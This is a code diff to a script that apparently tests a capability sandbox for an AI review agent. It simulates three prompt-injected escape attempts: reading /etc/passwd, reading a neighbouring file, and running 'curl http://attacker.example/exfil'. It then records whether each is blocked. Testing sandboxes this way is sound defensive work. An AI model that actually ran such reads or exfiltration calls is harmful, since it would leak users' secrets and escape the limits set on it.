@@ -44,11 +44,11 @@ let analyse = { |path|
 
     # Three prompt-injected escape attempts.  Each is a real capability
     # violation; grant blocks each one in-process.
-    let esc_fs_secret   = _try { let _ = !{read-file '/etc/passwd'} }
-    let esc_fs_sibling  = _try { let _ = !{read-file '/tmp/ral-ai-review/risky.py'} }
-    let esc_exec        = _try { curl http://attacker.example/exfil }
+    let esc_fs_secret   = try { let _ = !{read-file '/etc/passwd'} ; return 0 } { |e| return $e[status] }
+    let esc_fs_sibling  = try { let _ = !{read-file '/tmp/ral-ai-review/risky.py'} ; return 0 } { |e| return $e[status] }
+    let esc_exec        = try { curl http://attacker.example/exfil ; return 0 } { |e| return $e[status] }
 
-    let blocked = [fs_secret: $[$esc_fs_secret[status] != 0], fs_neighbor: $[$esc_fs_sibling[status] != 0], exec: $[$esc_exec[status] != 0]]
+    let blocked = [fs_secret: $[$esc_fs_secret != 0], fs_neighbor: $[$esc_fs_sibling != 0], exec: $[$esc_exec != 0]]
 
     return [file: !{base $path}, lines: !{length $lines}, bytes: !{length $content}, imports: $imports, suspicious: $suspect, blocked: $blocked]
 }
